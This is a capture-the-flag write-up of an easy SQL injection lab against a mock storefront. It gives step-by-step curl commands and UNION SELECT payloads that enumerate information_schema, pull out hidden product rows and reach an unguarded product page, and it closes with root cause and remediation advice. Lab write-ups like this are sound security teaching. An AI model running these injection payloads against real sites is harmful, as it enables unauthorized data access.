# BackAisle — SQL Injection (Easy) — Writeup

**Category:** SQL Injection
**Difficulty:** Easy
**Points:** 50 XP
**Flag:** `WEBVERSE{redacted}`

---

## Challenge Briefing

> Yardlines built their storefront on a long weekend in 2022. The category filter on the shop page was the kind of throwaway code you write at 2am with a deadline tomorrow — quick, direct, never revisited. They added a friends-and-family capsule program in 2024 and bolted a second visibility rule onto the same code path, figuring nobody could tell that capsule pieces existed if they weren't on the public grid. The grid is just one view of the data.

The briefing telegraphs two things:
1. The shop's category filter is unsanitized (classic SQLi).
2. There's hidden data (a "capsule" product line) excluded from the public grid by an app-level filter — not by access control on the underlying data.

---

## Recon

The target is a mock streetwear storefront ("Yardlines"). Browsing the homepage revealed the shop route and category links:

```
/shop.php?category=jackets
/shop.php?category=tees
/shop.php?category=hoodies
/shop.php?category=accessories
```

An initial guess at `/shop?category=...` (no `.php`) returned a 404 — the real endpoint is `/shop.php`.

---

## Step 1 — Confirming the Injection

Comparing a clean request against one with an injected single quote:

```bash
curl -s "$TARGET/shop.php?category=jackets" -o normal.html
curl -s "$TARGET/shop.php?category=jackets'" -o quote.html
diff normal.html quote.html
```

The quoted request threw a raw PHP/MySQLi error, leaking the query structure:

```
Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual
that corresponds to your MariaDB server version for the right syntax to use near
''jackets'' ORDER BY drop_date DESC' at line 1 in /var/www/html/shop.php:36
```

This confirmed:
- `category` is concatenated directly into a single-quoted string in the `WHERE` clause — classic in-band, error-based SQLi.
- Backend is **MariaDB**.
- The full query ends in `ORDER BY drop_date DESC`, which any injected payload needs to account for.

**Note on comment syntax:** Initial attempts using `--+-` as a SQL comment terminator failed, because MySQL/MariaDB only treats `--` as a comment starter when followed by an actual whitespace character — not literal `+`/`-` characters. Switching to `#` (comment-to-end-of-line, no trailing space required) fixed this immediately.

---

## Step 2 — Determining Column Count

Used an `ORDER BY` probe, incrementing until an "Unknown column" error appeared:

```bash
for i in 1 2 3 4 5 6 7 8; do
  curl -s -G "$TARGET/shop.php" --data-urlencode "category=jackets' ORDER BY $i#"
done
```

- Columns 1–7: no error
- Column 8: `Unknown column '8' in 'ORDER BY'`

→ **7 columns** in the underlying `SELECT`.

---

## Step 3 — UNION-Based Injection & Column Reflection

```bash
curl -s -G "$TARGET/shop.php" --data-urlencode "category=zzznotreal' UNION SELECT 1,2,3,4,5,6,7#"
```

The response rendered `2` in the product name (`pname`) field on the page — confirming **column 2** reflects to visible output. All subsequent extraction was placed in column 2.

---

## Step 4 — Database & Table Enumeration

```sql
UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR 0x0a),3,4,5,6,7
FROM information_schema.tables WHERE table_schema=database()
```

Result: two tables — `products` and `journal`.

```sql
UNION SELECT 1,GROUP_CONCAT(schema_name SEPARATOR 0x0a),3,4,5,6,7
FROM information_schema.schemata
```

Result: `information_schema`, `yardlines` (no separate "hidden" database — the capsule data lives inside the main `products` table).

---

## Step 5 — Column Enumeration & Row Count

```sql
UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR 0x0a),3,4,5,6,7
FROM information_schema.columns WHERE table_name='products' AND table_schema=database()
```

Columns: `id, slug, name, category, drop_name, drop_date, price_cents, fabric, origin, sizes, image, description, released, badge`

```sql
UNION SELECT 1,COUNT(*),3,4,5,6,7 FROM products
```

Result: **28 rows total** — but the storefront's own product counter only advertised **22 pieces**. That 6-row gap was the tell that the shop grid's `WHERE` clause was quietly excluding rows the database still held.

---

## Step 6 — Finding the Hidden Rows

Dumping `name`, `category`, and `drop_name` for every row surfaced the discrepancy immediately — three products tagged with a drop name of **`F&F 25`** (friends-and-family) that never appeared in any category listing on the site:

```sql
UNION SELECT 1,GROUP_CONCAT(name,0x7c,category,0x7c,drop_name SEPARATOR 0x0a),3,4,5,6,7 FROM products
```

Hidden rows:
| Name | Category | Drop |
|---|---|---|
| Founders Coat — F&F Capsule | jackets | F&F 25 |
| Hold-Open Mockup Hoodie | hoodies | F&F 25 |
| Sample Run Caps — Bone | accessories | F&F 25 |

This exactly matches the briefing: a second visibility rule (likely `AND drop_name != 'F&F 25'` or an `is_public` style flag on the `drop_name`) bolted onto the shop grid's query to hide the capsule pieces from public browsing — without actually restricting access to the underlying product data or its direct page.

---

## Step 7 — Extracting the Slugs

```sql
UNION SELECT 1,GROUP_CONCAT(slug SEPARATOR 0x0a),3,4,5,6,7
FROM products WHERE drop_name='F&F 25'
```

Result:
```
founders-coat-ff
hold-open-hoodie
sample-run-caps
```

*(Note: pulling multiple nullable columns at once via `GROUP_CONCAT(CONCAT(...))` returned empty — MySQL's `CONCAT()` returns `NULL` if any single argument is `NULL`, silently nuking the whole aggregate. Switching to `CONCAT_WS()`, which skips `NULL` fields instead of failing, or extracting one column at a time avoids this trap.)*

---

## Step 8 — The Flag

The shop grid filtered capsule items out of category listings, but **`product.php?slug=...` had no equivalent check** — the individual product page route was never updated when the friends-and-family visibility rule was bolted onto `shop.php`. Requesting the capsule slugs directly:

```bash
curl -s "$TARGET/product.php?slug=founders-coat-ff"
```

returned the full product description, containing the flag in plaintext:

```
Friends-and-family capsule run, never listed publicly. Internal SKU:
WEBVERSE{redacted}. Pattern reused from the Fall 23
Field Coat with the inner pocket re-positioned for a 13-inch laptop.
Twelve units total, all spoken for.
```

**Flag:** `WEBVERSE{redacted}`

---

## Root Cause

- `shop.php` builds SQL by string concatenation of the `category` GET parameter — no parameterized queries, no input sanitization → classic error-based/UNION SQLi.
- The friends-and-family visibility rule was implemented as a filter on the **listing query only**. It never touched:
  - Direct product-page access (`product.php?slug=...`), which had no visibility check at all.
  - The database itself, which still contained the capsule rows in the same table as public inventory.
- Security-by-obscurity ("nobody could tell capsule pieces existed if they weren't on the grid") failed the moment any query path — legitimate or injected — could reach the underlying rows or guess/enumerate a slug.

## Remediation

1. Use parameterized queries / prepared statements for the `category` filter.
2. Enforce visibility rules (e.g. `is_public` / `drop_name` checks) consistently across **every** code path that can return product data, including direct-access routes like `product.php`.
3. Don't rely on absence from a listing page as an access control mechanism — anything reachable by a guessable or enumerable identifier needs its own authorization check.
